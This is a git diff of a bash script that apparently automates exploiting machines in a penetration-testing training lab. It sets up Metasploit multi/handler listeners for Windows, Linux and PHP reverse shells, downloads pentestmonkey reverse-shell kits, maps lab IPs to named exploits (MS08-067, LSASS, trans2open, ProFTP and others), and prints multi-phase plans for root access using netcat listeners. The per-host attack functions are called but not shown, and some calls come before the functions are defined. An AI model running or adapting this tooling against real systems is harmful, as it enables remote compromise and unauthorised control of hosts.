@@ -11,6 +11,15 @@
 #                 w/ Love:                                                     #
 #                                 no1special                                   #
 ################################################################################
+# REVERTER INFORMATION AND URL CONSTRUCTOR
+# revurl="https://10.10.10.7/functions/revert_machine_admin.php";
+# wgetaction="wget `echo -n $revurl` -T 5 -t 1 --no-check-certificate ";
+# poststring="--post-data=\"";
+# postaction="awlAction=login&";
+# postuser="awlUserName=OSIDNUM&";
+# postpass="awlPasswd=PASS&";
+# posttype="type=servers&";
+# poststrike="strike=0&";
 title() {
   echo;
   echo -e "({[>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<]})";
@@ -33,89 +42,89 @@ title() {
   echo -e "({[>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<]})";
   echo;
 }
-(title);
+title
 ################################################################################
 # set some variables for the application, ... 
 # I do not think this is a script anymore ....
 ################################################################################
 setlabvars() {
   setVPN() {
-    # VPN Configuration file locations
-    lab11="/root/lab11/lab.conf"; # vpn config
-    lab13="/root/lab13/lab.conf"; # vpn config
-    lab15="/root/lab15/lab.conf"; # vpn config
+    lab11="/root/lab11/lab.conf";
+    lab13="/root/lab13/lab.conf"; 
+    lab15="/root/lab15/lab.conf";
   }
-  (setVPN);
+  setVPN;
   setInterface() {
-    # Interface and Subnet Variables
-    iface1=$(ifconfig `# runs ifconfig` |\
-             grep "10.10.10.1" `# looks for specific broadcast address` |\
-             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
-    iface2=$(ifconfig |\ `# runs ifconfig`
-             grep "10.10.12.1" |\ `# looks for specific broadcast address`
-             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
-    iface3=$(ifconfig |\ `# runs ifconfig`
-             grep "10.10.14.1" |\ `# looks for specific broadcast address`
-             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
-    testiface4=$(ifconfig `# runs ifconfig` |\
-             grep "172.27.*" `# looks for specific broadcast address` |\
-             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
-    lh1=$(ifconfig $iface1 |\ `# runs ifconfig on specific interface`
-          grep "inet" |\ `# grep for inet string`
-          tr -s "\n" " " |\ `# replace all newline characters with a space`
-          sed -r "s/ (.*)/\1/g" |\ `# removes any space infront of a string`
-          cut -d" " -f2 `# cut at delimited field set by space`);
-    lh2=$(ifconfig $iface2 |\ `# runs ifconfig on specific interface`
-          grep "inet" |\ `# grep for inet string`
-          tr -s "\n" " " |\ `# replace all newline characters with a space`
-          sed -r "s/ (.*)/\1/g" |\ `# removes any space infront of a string`
-          cut -d" " -f2 `# cut at delimited field set by space`);
-    lh3=$(ifconfig $iface3 |\ `# runs ifconfig on specific interface`
-          grep "inet" |\ `# grep for inet string`
-          tr -s "\n" " " |\ `# replace all newline characters with a space`
-          sed -r "s/ (.*)/\1/g" |\ `# removes any space infront of a string`
-          cut -d" " -f2 `# cut at delimited field set by space`);
+    iface1=$(ifconfig |\
+             grep "10.10.10.1" |\
+             sed -r "s/inet (.*) netmask(.*)/\1/g";)
+    iface2=$(ifconfig |\
+             grep "10.10.12.1" |\
+             sed -r "s/inet (.*) netmask(.*)/\1/g";)
+    iface3=$(ifconfig |\
+             grep "10.10.14.1" |\
+             sed -r "s/inet (.*) netmask(.*)/\1/g";)
+    testiface4=$(ifconfig  |\
+             grep "172.27.*" |\
+             sed -r "s/inet (.*) netmask(.*)/\1/g";)
+    lh1=$(ifconfig $iface1|\
+          grep "inet" |\
+          tr -s "\n" " " |\
+          sed -r "s/ (.*)/\1/g"|\
+          cut -d" " -f2);
+    lh2=$(ifconfig $iface2|\
+          grep "inet" |\
+          tr -s "\n" " " |\
+          sed -r "s/ (.*)/\1/g"|\
+          cut -d" " -f2 );
+    lh3=$(ifconfig $iface3 |\
+          grep "inet"|\
+          tr -s "\n" " "|\
+          sed -r "s/ (.*)/\1/g"|\
+          cut -d" " -f2 );
+    lh4=$(ifconfig $iface4 |\
+          grep "inet"|\
+          tr -s "\n" " "|\
+          sed -r "s/ (.*)/\1/g"|\
+          cut -d" " -f2 );
   }
-  (setinterface);
+  setInterface;
   setmsf() {
-    # Get Metasploit location from system
-    (updatedb); # needed to ensure the locate DB is up-to-date
+    (updatedb);
     msfp=$(locate msfconsole |\
            grep metasploit-framework |\
-           sed -r "s/(.*)\/msfconsole/\1/"); # metasploit directory
-    msfc="$msfp/msfconsole"; # msfconsole
-    msfv=`locate msfvenom | grep bin`
-    msfs="$msfp/scripts"; # msfscripts dir
-    mpld=`locate msfpayload | head -n1`
+           sed -r "s/(.*)\/msfconsole/\1/");
+    msfc="$msfp/msfconsole"; 
+    msfv=`locate msfvenom | grep bin`; 
+    msfs="$msfp/scripts";
   }
-  (setmsf);
+  setmsf
   sethandler() {
-    # MULTIHANDLER INFORMATION (Change me as needed)
-    winrevpay="windows/meterpreter/reverse_tcp"; # primary metasploit payload
-    linrevpay="linux/meterpreter/reverse_tcp"; # primary metasploit payload
-    handler="exploit/multi/handler"; # used to build main Multihandler Shell Script
-    DPH="DisablePayloadHandler True"; # Disable metasploit Payload Handler
+    winmetrev="windows/meterpreter/reverse_tcp";
+    linmetrev="linux/x86/meterpreter/reverse_tcp"; 
+    handler="exploit/multi/handler"; 
+    DPH="DisablePayloadHandler True"; 
     autoRoute="post/windows/manage/autoroute";
-    lp="443" # sets Multihandler listening port for Windows Reverse Payloads
-    lrs="linux/x86/shell_reverse_tcp" # Standard Linux Reverse payload
-    lmr="linux/x86/meterpreter/reverse_tcp" # Linux Meterpreter Reverse payload
+    lp="443"
+    lrs="linux/x86/shell_reverse_tcp"
+    lmr="linux/x86/meterpreter/reverse_tcp" 
   }
-  (sethandler);
-  # REVERTER INFORMATION AND URL CONSTRUCTOR
-  # revurl="https://10.10.10.7/functions/revert_machine_admin.php";
-  # wgetaction="wget `echo -n $revurl` -T 5 -t 1 --no-check-certificate ";
-  # poststring="--post-data=\"";
-  # postaction="awlAction=login&";
-  # postuser="awlUserName=OSIDNUM&";
-  # postpass="awlPasswd=PASS&";
-  # posttype="type=servers&";
-  # poststrike="strike=0&";
+  sethandler
+  newdescription() {
+    echo "\x6e\x6f\x31\x73 \
+          \x70\x65\x63\x69 \
+          \x61\x6c\x6d\x61 \
+          \x64\x65\x6d\x65" |\
+          tr -s " " |\
+          sed -r "s/ //g";
+  }
+  newdes=`newdescription`
   setlabexploits() {
-    # EXPLOITS FOR LAB MACHINES
-    aliceExploit="exploit/windows/smb/ms04_011_lsass"; # primary exploit for Alice machine
+    aliceExploit="exploit/windows/smb/ms04_011_lsass"
     bobExploit="exploit/windows/smb/ms08_067_netapi"
     oracleExploit="windows/dcerpc/ms03_026_dcom"
     padroExploit="exploit/windows/fileformat/adobe_utilprintf"
+    redhatt2Exploit="exploit/linux/samba/trans2open"
     rh9Exploit="exploit/multi/ftp/wuftpd_site_exec_format"
     masterExploit="exploit/windows/smb/ms09_050_smb2_negotiate_func_index"
     slaveExploit="exploit/windows/dcerpc/ms07_029_msdns_zonename"
@@ -126,143 +135,170 @@ setlabvars() {
     helpdeskExploit="windows/smb/ms09_050_smb2_negotiate_func_index"
     debianExploit="linux/ftp/proftp_telnet_iac"
   }
-  (setlabexploits);
+  setlabexploits
 }
-(setlabvars);
+setlabvars;
 # CHECK FOR SYSTEM PROCESSES
 checkapache() {
-  ps -A `# check system processes -A (all)` |\
-  grep apache2 `# grep for apache2` |\
-  tr -s "\t" " " `# replace any tabs with space` |\
-  cut -d " " -f4 `# cut at delimited field set by space` |\
-  sort -u `# sort all results to be unique` |\
-  head -n1 `# only take the first result (overkill)`
+  ps -A |\
+  grep apache2 |\
+  tr -s "\t" " " |\
+  cut -d " " -f4  |\
+  sort -u |\
+  head -n1
+}
+disablephprestart() {
+  a2dismod php7.0 >/dev/null;
+  systemctl start apache2 >/dev/null;
+}
+stopdisablephprestart() {
+ systemctl stop apache2 >/dev/null;
+ a2dismod php7.0 >/dev/null;
+ systemctl start apache2 >/dev/null;
+}
+enablephprestart() {
+  a2enmod php7.0 >/dev/null;
+  systemctl start apache2 >/dev/null;
+}
+stopenablephprestart() {
+ systemctl stop apache2 >/dev/null;
+ a2enmod php7.0 >/dev/null;
+ systemctl start apache2 >/dev/null;
+}
+# These are the brakes
+checkthebrakesAll() {
+  echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+}
+checkthebrakesTop() {
+  echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+}
+checkthebrakesBot() {
+  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+}
+checkthebrakesNo() {
+  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 }
 ################################################################################
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~> PREREQUISITES <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 ################################################################################
+echoStatement() {
+  checkthebrakesTop;
+  echo -e "\t[*] $1" ;
+  checkthebrakesBot;
+}
 checkmonkey() {
-  # checks for pentestmonkey reverse php shell
-  # if not found - Download / Decompress it  
-  if [ ! -f $msfs/php-rev.tar.gz ];
+  if [ ! -f $msfs/php-rev.tar.gz ]; 
     then
+      echoStatement "Downloading Pentest Money PHP Shell "
       wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz \
-        -O $msfs/php-rev.tar.gz
-      tar -zxvf $msfs/php-rev.tar.gz
+        -O $msfs/php-reverse-shell-1.0.tar.gz
+      cd $msfs;
+      echoStatement "Expanding $msfs/php-reverse-shell-1.0.tar.gz"
+      tar -zxvf $msfs/php-reverse-shell-1.0.tar.gz
+      cd ~;
+  fi;
+  if [ ! -f $msfs/perl-reverse-shell-1.0.tar.gz ];
+    then
+      echoStatement "Downloading Pentest Money Perl Shell "
+      wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz \
+        -O $msfs/perl-reverse-shell-1.0.tar.gz
+      cd $msfs;
+      echoStatement "Expanding $msfs/perl-reverse-shell-1.0.tar.gz"
+      tar -zxvf perl-reverse-shell-1.0.tar.gz
+      cd ~;
   fi;
 }
-(checkmonkey);
+checkmonkey
 ################################################################################
 # Xterm kicker script for code reduction (Log all the things)
 # Usage: makeXtermLog "Window Title" "Executable"
 # Example: makeXtermLog List_Directories "ls -asl && sleep 5"
 ################################################################################
 makeXtermLog() {
-  if [ -f $1-log.txt ]; `# check for existing log file`;
+  if [ -f $1-log.txt ];
     then
-      rm $1-log.txt; `# remove it before it becomes a problem`;
+      rm $1-log.txt 2>/dev/null;
   fi;
-  xterm -bc `# opens xterm window` \
-    -bd white `# sets windows border color` \
-    -bg black `# sets window background color` \
-    -fg green `# sets windows foreground color (text)` \
-    -l `# Enables loggin` \
-    -lf $1-log.txt `# sets logging file name` \
-    -leftbar `# Force scrollbar to the left side of VT100 screen` \
-    -ls `# sets terminal as Login shell` \
-    -name $1 `# sets resource name` \
-    -ms yellow `# sets the pointer cursor` \
-    -selbg orange `# sets the background of selected text` \
-    -selfg black `# sets the foreground of selected text` \
-    -title $1 `# sets the Window Title bar` \
-    -e "$2" `# sets the executable to be run`; 
+  xterm -bc \
+    -bd white \
+    -bg black \
+    -fg green \
+    -l \
+    -lf $1-log.txt \
+    -leftbar \
+    -ls \
+    -name $1 \
+    -ms yellow \
+    -selbg orange \
+    -selfg black \
+    -title $1 \
+    -e "$2"; 
 }
 # Xterm kicker script for code reduction
 # Usage: makeXtermNoLog "Resource_Name" "Window Title" "Executable"
 # Example: makeXtermNoLog "List_Directories" "ls -asl | grep file; sleep 5"
 makeXtermNoLog() {
-  # Make Xterm launcher function for code reduction
-  # Make Xterm launcher function for code reduction
-  xterm -bc `# opens xterm window`\
-    -bd white `# sets windows border color`\
-    -bg black `# sets window background color`\
-    -fg green `# sets windows foreground color (text)`\
-    +l `# Disables loggin`\
-    -leftbar `# Force scrollbar to the left side of VT100 screen`\
-    -ls `# sets terminal as Login shell`\
-    -name $1 `# sets resource name`\
-    -ms yellow `# sets the pointer cursor`\
-    -selbg orange `# sets the background of selected text`\
-    -selfg black `# sets the foreground of selected text`\
-    -title $1 `# sets the Window Title bar`\
-    -e $2 `# sets the executable to be run`;
-}
-# These are the brakes
-checkthebrakesAll() { `# makes the linebreak have newline characters in front and back`
-  echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
-}
-checkthebrakesTop() { `# makes the linebreak have newline characters in front only`
-  echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-}
-checkthebrakesBot() { `# makes the linebreak have newline characters in back only`
-  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
-}
-checkthebrakesNo() { `# makes the linebreak without newline characters`
-  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+  xterm -bc \
+    -bd white \
+    -bg black \
+    -fg green \
+    +l \
+    -leftbar \
+    -ls \
+    -name $1 \
+    -ms yellow \
+    -selbg orange \
+    -selfg black \
+    -title $1 \
+    -e $2;
 }
 # Checks for Ckermit FTP ...
 checkthefrog() {
-  # checks in binary is found on the system
   if [ ! -f /usr/bin/kermit ];
     then
-      checkthebrakesTop;
-      echo -e "\t[!] Ckermit is not installed, standby for update and installation" 1>&2
-      checkthebrakesBot;
-      apt-get update >/dev/null `# conduct an update of the Apt db`;
-      apt-get install -y ckermit >/dev/null `# Attempt to install ckermit FTP`;
+      echoStatement "Ckermit is not installed, standby for update and installation" 1>&2
+      apt-get update >/dev/null;
+      apt-get install -y ckermit >/dev/null;
     else
-      checkthebrakesTop;
-      echo -e "\t[!] Ckermit is currently installed, nothing left todo" 1>&2
-      checkthebrakesBot;
+      echoStatement "Ckermit is currently installed, nothing left todo" 1>&2
   fi
 }
-(checkthefrog);
+checkthefrog
 # produce the multihandler recourse file
 makehandlerrc() { 
   # produce the Primary multihandler recourse file
-  if [ ! -f $msfs/multihandler443.rc ]; `# check for files existance`
+  if [ ! -f $msfs/multihandler.rc ];
     then
-      checkthebrakesTop
-      echo -e "\t[!] The file: $msfs/multihandler443.rc\n\t\twas not found, now producing ..." 1>&2
-      checkthebrakesBot
-      echo -e "use $handler" > $msfs/multihandler443.rc
-      echo -e "set PAYLOAD $pay" >> $msfs/multihandler443.rc
-      echo -e "set LPORT $lp" >> $msfs/multihandler443.rc
-      echo -e "set LHOST 0.0.0.0" >> $msfs/multihandler443.rc
-      echo -e "set ExitOnSession false" >> $msfs/multihandler443.rc
-      echo -e "exploit -j -z" >> $msfs/multihandler443.rc
+      echoStatement "The file: $msfs/multihandler.rc\n\t\twas not found, now producing ..." 1>&2
+      echo -e "use $handler" > $msfs/multihandler.rc
+      echo -e "set PAYLOAD $winmetrev" >> $msfs/multihandler.rc
+      echo -e "set LPORT $lp" >> $msfs/multihandler.rc
+      echo -e "set LHOST 0.0.0.0" >> $msfs/multihandler.rc
+      echo -e "set ExitOnSession false" >> $msfs/multihandler.rc
+      echo -e "exploit -j -z" >> $msfs/multihandler.rc
+      echo -e "set PAYLOAD php/reverse_php" >> $msfs/multihandler.rc
+      echo -e "set LPORT 6341" >> $msfs/multihandler.rc
+      echo -e "set LHOST 0.0.0.0" >> $msfs/multihandler.rc
+      echo -e "set ExitOnSession false" >> $msfs/multihandler.rc
+      echo -e "exploit -j -z" >> $msfs/multihandler.rc
+      echo -e "set PAYLOAD $linmetrev" >> $msfs/multihandler.rc
+      echo -e "set LHOST 0.0.0.0" >> $msfs/multihandler.rc
+      echo -e "set ExitOnSession false" >> $msfs/multihandler.rc
+      echo -e "set LPORT 1889" >> $msfs/multihandler.rc
+      echo -e "exploit -j -z" >> $msfs/multihandler.rc
     else
-      checkthebrakesTop
-      echo -e "\t[!] The file: $msfs/multihandler443.rc" 1>&2
-      echo -e "\t\texists on the system, nothing left todo" 1>&2
-      checkthebrakesBot
+      echoStatement "The file: $msfs/multihandler.rc\t\texists on the system, nothing left todo" 1>&2
   fi
 }
-(makehandlerrc);
+makehandlerrc
 mhScript() {
   # Produces the multi.sh script to launch the multihandler 
   if [ ! -f $msfs/multi.sh ]; 
     then
-      checkthebrakesTop
-      echo -e "\t[!] The $msfs/multi.sh script was not found" 1>&2
-      echo -e "\t\tproducing the multi.sh script" 1>&2
-      checkthebrakesBot
+      echoStatement "The $msfs/multi.sh script was not found\t\tproducing the multi.sh script" 1>&2
       cat << EOF > $msfs/multi.sh
 #!/bin/bash
-checkthebrakesTop;
 echo -e "\t[*] Metasploit MultiHandler Console is Launching Now...";
-checkthebrakesBot;
-# opens XTERM window for Metasploit MultiHandler, with logging
 rm mh-execution-log.txt >/dev/null
 xterm -bc \
 -bd white \
@@ -277,19 +313,15 @@ xterm -bc \
 -selbg orange \
 -selfg black \
 -title "Metasploit MultiHandler Console" \
--e $msfc -r $msfs/multihandler443.rc 1>/dev/null &
+-e $msfc -r $msfs/multihandler.rc 1>/dev/null &
 EOF
-      chmod a+x $msfs/multihandler443.rc;
+      chmod a+x $msfs/multihandler.rc;
     else
-      checkthebrakesTop
-      echo -e "\t[!] The $msfs/multi.sh script exists on the system, nothing left todo" 1>&2
-      checkthebrakesBot
+      echoStatement "The $msfs/multi.sh script exists on the system, nothing left todo" 1>&2
   fi;
 }
-(mhScript);
+mhScript
 checkMH() {
-  # Check if there is a multihandler already listening on 0.0.0.0:443
-  # if the service is litening on this port already ... continue if so
   chkmh=`netstat -antelop |\
     grep "ruby" |\
     tr -s " " |\
@@ -298,45 +330,449 @@ checkMH() {
     cut -d":" -f2`
   if [ "$chkmh" != "443" ];
     then
-      (makeXtermLog "Metasploit_MultiHandler_Console" "$msfc -r $msfs/multihandler443.rc" &) >/dev/null
+      echoStatement "Launching the Multihandler Console now ..."
+      (makeXtermLog "Metasploit_MultiHandler_Console" "$msfc -r $msfs/multihandler.rc" &) >/dev/null
     else
-      checkthebrakesTop;
-      echo -e "\t[*] The Metasploit Console MultiHandler is already operational!" 1>&2;
-      checkthebrakesBot;
+      echoStatement "The Metasploit Console MultiHandler is already operational!" 1>&2;
   fi
 }
-(checkMH);
+checkMH
+#
+################################################################################
+#~~~~~~~~~~~~~~~~~~~> GAME OF LABS & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~#
+################################################################################
+#
+# start POP-A-BOX
+# Checking id used spawned terminals and killing them as needed!
+GameOfLABS() {
+  # Read userinput from STDIN
+  # Take IP as variable
+  # Use against a list of known targets....
+  # Kick off functions as needed per host
+  checkthebrakesTop;
+  echo -e "[*] Thank you for playing the Game of LABS, "
+  echo -e "\t[?] What do you want to do? - Answers are: 'pop XOR revert' choose wisely\n"
+  takeIP() {
+    read selection;
+    if [ "$selection" == "pop" ];
+      then
+        echo -e "\n[*] Please enter an IP address to Exploit ...\n"
+        read uip
+        echo;
+        checkthebrakesNo;
+        chopandskew() {
+          loctet=`echo $uip | cut -d"." -f4`;
+          toctet=`echo $uip | cut -d"." -f3`;
+        }
+        chopandskew;
+        echo $toctet
+        echo $loctet
+        checkthebrakesBot
+    fi;
+  }
+  takeIP;
+  makeuservar() {
+    # AttackerIP Configuration
+    if [ "$toctet" == "11" ];
+      then
+        AttackerIP=$lh1
+      elif [ "$toctet" == "13" ];
+        then
+          AttackerIP=$lh2
+      elif [ "$toctet" == "15" ];
+        then
+          AttackerIP=$lh3
+    fi;
+  }
+  makeuservar
+  exploitboxes
+}
+GameOfLABS
+#
+################################################################################
+#~~~~~~~~~~~~~~~~~~~~~> POP-A-BOX & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~~#
+################################################################################
+#
+# start POP-A-BOX
+# Checking id used spawned terminals and killing them as needed!
+exploitboxes() {
+  echo $loctet
+  if [ "$loctet" == "201" ];
+    then
+      alicedescription() {
+        checkthebrakesTop;
+        echo -e "\t[*] Alice Exploitation is described as follows: "
+        echo -e "\t\t[-] Description:" 
+        echo -e "\t\t      Alice has an unpatched vulnerability on her machine"
+        echo -e "\t\t      This vulnerability has PoC code located in metasploit"
+        echo -e "\t\t      Attacking the exposed SMB port, LSASS can be overflown"
+        echo -e "\t\t[-] Use Metasploit:"
+        echo -e "\t\t      (RCE) - $aliceExploit"
+        echo -e "\t[!] This exploit will give System/NT_Auth access to the host "
+        checkthebrakesBot;
+      }
+      alicedescription
+      AliceInWonderland
+    elif [ "$loctet" == "202" ];
+      then
+        # Choose GHOST
+        ghostdescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] Ghost Exploitation is multi-phased as described below: "
+          echo -e "\t\t[-] Description:"
+          echo -e "\t\t        Phase1: "
+          echo -e "\t\t        Phase2: "
+          echo -e "\t\t        Phase3: "
+          echo -e "\t\t[-] Use Public Proof of Concept (PoC) Exploit:"
+          echo -e "\t[*] These exploit will give root user access to the host "
+          checkthebrakesBot;
+        }
+        (ghostdescription);
+        (GhostAttack);
+    elif [ "$loctet" == "203" ]; 
+      then
+        # Choose BOB 1
+        (killBoB)
+    elif [ "$loctet" == "204" ]; 
+      then
+        # Choose BOB 2
+        (killBoB)
+    elif [ "$loctet" == "205" ]; 
+      then
+        # Choose ORACLE 1
+        (talkTotheOracle1)
+    elif [ "$loctet" == "206" ]; 
+      then
+        # Choose ORACLE 2
+        (talkTotheOracle2)
+    elif [ "$loctet" == "207" ]; 
+      then
+        # Choose ORACLE 2
+        (PedroSanchez)
+    elif [ "$loctet" == "208" ];
+      then
+        # Choose Phoenix
+        (RiseofthePhoenix);
+    elif [ "$loctet" == "209" ];
+      then
+        # Choose Cacti
+        cactidescription() {
+         checkthebrakesTop;
+          echo -e "\t[*] Cacti Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      Cacti is a multiphased attack vector which chains commands and files"
+          echo -e "\t\t        Phase1: Abuses Cacti RCE to Down&Exec malicious code"
+          echo -e "\t\t        Phase2: Configures a NC listener on 8080 to send additional commands"
+          echo -e "\t\t        Phase3: Abuses Cacti RCE to Down meterpreter for redundency"
+          echo -e "\t\t        Phase4: Abuses Cacti RCE to send Linux Reverse Meterpreter shell"
+          echo -e "\t\t        Phase5: Configures a NC listener on 8081 to catch remote root shell"
+          echo -e "\t\t        Phase6: Abuses Cacti RCE to send root shell to netcat listener from local exploit"
+          echo -e "\t\t[-] Use Public Proof of Concept (PoC) Exploit:"
+          echo -e "\t\t      (RCE) - /usr/share/exploitdb/platforms/php/webapps/3029.php"
+          echo -e "\t\t      (LRE) - /usr/share/exploitdb/platforms/linux/local/2011.sh"
+          echo -e "\t[*] These exploit will give root user access to the host "
+          checkthebrakesBot;
+        }
+        (cactidescription);
+        (CactiSpine);
+    elif [ "$loctet" == "211" ];
+      then
+        # Choose Trix
+        trixdescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] TrixBox Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      TrixBox can be exploited with a single Proof of Concept (PoC)"
+          echo -e "\t\t        Phase1: Start a NC listener on port 8082"
+          echo -e "\t\t        Phase2: Launch the POC and direct it to your Attackers IP and NC port"
+          echo -e "\t\t[-] Use Public Proof of Concept (PoC) Exploit:"
+          echo -e "\t\t      (RCE) - /usr/share/exploitdb/platforms/linux/remote/6045.py"
+          echo -e "\t[*] This exploit will give root user access to the host"
+          checkthebrakesBot;
+        }
+        (trixdescription);
+        (SillyRabbit);
+    elif [ "$loctet" == "213" ];
+      then
+        # Choose MSFPRO 1
+          msfpdescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] MSFPro Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      MSF Pro is provided to LABs users to tryout MSF Pro
+          echo -e "\t\t        Phase1: Use the known USer/Pssword combination"
+          echo -e "\t\t        Phase2: Dont really attack it, can if you want ..."
+          echo -e "\t\t[-] Use Public Proof of Concept (PoC) Exploit:"
+          echo -e "\t\t      (Exposed Credentials) - Try Harder, to find them"
+          echo -e "\t[*] This exploit will give user access to the host"
+          checkthebrakesBot;
+        }
+        (msfpdescription);
+        (MSFPRO)
+    elif [ "$loctet" == "214" ];
+      then
+        # Choose MSFPRO 2
+        (msfpdescription);
+        (MSFPRO)
+    elif [ "$loctet" == "215" ];
+      then
+        # Choose RedHat
+        redhatdescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] RedHat Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      RedHat has two(2) attack platforms which gain root access"
+          echo -e "\t\t        Attack1: Proof of Concept Perl code in Exploit-DB"
+          echo -e "\t\t        Attack2: Metasploit-Framework"
+          echo -e "\t\t[-] Use Public Proof of Concept (PoC) Exploit:"
+          echo -e "\t\t      (PoC) - /usr/share/exploitdb/platforms/linux/remote/7.pl"
+          echo -e "\t\t      (MSF) - $redhatt2Exploit"
+          echo -e "\t[*] Either of these exploits will give root user access to the host "
+          checkthebrakesBot;
+        }
+        (redhatdescription);
+        (RedHatHaXoR)
+    elif [ "$loctet" == "217" ];
+      then
+        # Choose RedHat9
+        (RedHatHaXin9)
+    elif [ "$loctet" == "220" ];
+      then
+        # Choose Master
+        masterdescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] Master Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      Master can be exploited with a single Proof of Concept (PoC)"
+          echo -e "\t\t        Phase1: Produce Metasploit RC file and execute"
+          echo -e "\t\t[-] Use Public Proof of Concept (PoC) Exploit:"
+          echo -e "\t\t      (RCE) - $masterExploit"
+          echo -e "\t[*] This exploit will give System/NT_Auth user access to the host"
+          checkthebrakesBot;
+        }
+        (masterdescription);
+        (MasterAttack)
+    elif [ "$loctet" == "221" ];
+      then
+        # Choose Slave
+        slavedescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] Slave Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      Slave can be exploited with a single Proof of Concept (PoC)"
+          echo -e "\t\t        Phase1: Produce Metasploit RC file and execute"
+          echo -e "\t\t[-] Use Public Proof of Concept (PoC) Exploit:"
+          echo -e "\t\t      (RCE) - $slaveExploit"
+          echo -e "\t[*] This exploit will give System/NT_Auth user access to the host"
+          checkthebrakesBot;
+        }
+        (slavedescription);
+        (SlaveAttack)
+    elif [ "$loctet" == "222" ];
+      then
+        # Choose MailMan
+        (MailMan)
+    elif [ "$loctet" == "223" ];
+      then
+        # Choose Jeff
+        (djJazzy)
+    elif [ "$loctet" == "224" ];
+      then
+        # Choose CSCart
+        (cscartfsk)
+    elif [ "$loctet" == "226" ];
+      then
+        # Choose IT Joe
+        (ITJoe)
+    elif [ "$loctet" == "227" ];
+      then
+        # Choose WebSQL
+        (WebSQL)
+    elif [ "$loctet" == "229" ];
+      then
+        # Choose ThinMail
+        (ThinMail)
+    elif [ "$loctet" == "231" ];
+      then
+        # Choose Ralph
+        (Ralph)
+    elif [ "$loctet" == "234" ];
+      then
+        # Choose Gentoo
+        (Gentoo)
+    elif [ "$loctet" == "235" ];
+      then
+        # Choose Pain
+        (Pain)
+    elif [ "$loctet" == "236" ];
+      then
+        # Choose Suffer
+        (sufferMore)
+    elif [ "$loctet" == "241" ];
+      then
+        # Choose FC4ME
+        (fc4me)
+    elif [ "$loctet" == "242" ];
+      then
+        # Choose FC4ME
+        (fc4me)
+    elif [ "$loctet" == "245" ];
+      then
+        # Choose HelpDesk
+        (helpdesk)
+    elif [ $loctet == "247" ];
+      then
+        # Choose Cory
+        (cory)
+    elif [ "$loctet" == "249" ];
+      then
+        # Choose Debian
+        debiandescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] Debian Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      Debian has a vulnerable ProFTP installed without StackSmashing protections"
+          echo -e "\t\t      This vulnerability has PoC code located in metasploit"
+          echo -e "\t\t      Attacking the exposed FTP port, ProFTP can be overflown"
+          echo -e "\t\t[-] Use Metasploit:"
+          echo -e "\t\t      (RCE) - $DebianExploit"
+          echo -e "\t[!] This exploit will give root user access to the host "
+          checkthebrakesBot;
+        }
+        (debiandescription);
+        (debian)
+    elif [ "$loctet" == "251" ];
+      then
+        # Choose Sean
+        seandescription() {
+          checkthebrakesTop;
+          echo -e "\t[*] Sean Exploitation is described as follows: "
+          echo -e "\t\t[-] Description:" 
+          echo -e "\t\t      Sean can be exploited by loggin in and issuing 'sudo su'"
+          echo -e "\t\t        Phase1: Discover Seans password"
+          echo -e "\t\t        Phase2: Start a NC listener"
+          echo -e "\t\t        Phase3: Login and run the local NC on sean as sudo"
+          echo -e "\t\t[-] Use the following methodology for Exploitation:"
+          echo -e "\t\t      (BruteForce) - Discover the password for SSH"
+          echo -e "\t[*] This exploit will give root user access to the host"
+          checkthebrakesBot;
+        }
+        (seandescription);
+        (Sean);
+  fi;
+}
+#if [ `echo $uip | cut -d"." -f4` == "203" ]; then
